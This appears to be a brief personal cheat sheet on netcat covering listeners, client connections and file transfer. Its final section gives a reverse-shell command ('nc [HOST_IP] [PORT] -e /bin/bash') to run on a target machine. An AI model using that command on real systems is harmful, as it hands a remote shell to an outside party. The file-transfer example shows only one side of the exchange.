# Netcat
Netcat is a tool that reads and writes data across network connections, using TCP or UDP protocol. More information [Link](https://blog.ikuamike.io/posts/2021/netcat/)

## Server Mode
Use netcat to listen for connections. What this does is open a port (either tcp or udp) on the system. By default netcat listens on tcp.

> Basic Listener
```bash
$ nc -lvnp PORT
```
[-l]: Listen incoming connection
[-v]: Verbose output
[-n]: Do not do DNS
[-p]: Specifies source port nc should use

To listen on UDP must use `-u`.

## Client Mode
Use netcat to connect to an open port on a system. This can be beneficial for manually checking service banners or just checking if the port is open.

> Basic Connection
```bash
$ nc -vn @IP PORT
```

For a UDP connection we only add the `-u` option.

## File Transfer
Transfer files over the connection from one system to another without distortion.
Don’t really care about which is the server and which is the client because the transfer can go either direction but we need to run the listener first.

> Transfer file on Server1 to Server2
```bash
nc 192.168.125.10 8080 > /path/to/outfile 
```


## 

Send a Reverse Shell

From target machine:

```bash
$ nc [HOST_IP] [PORT] -e /bin/bash
```

# 

Tags

[#cheat-sheet](app://obsidian.md/index.html#cheat-sheet)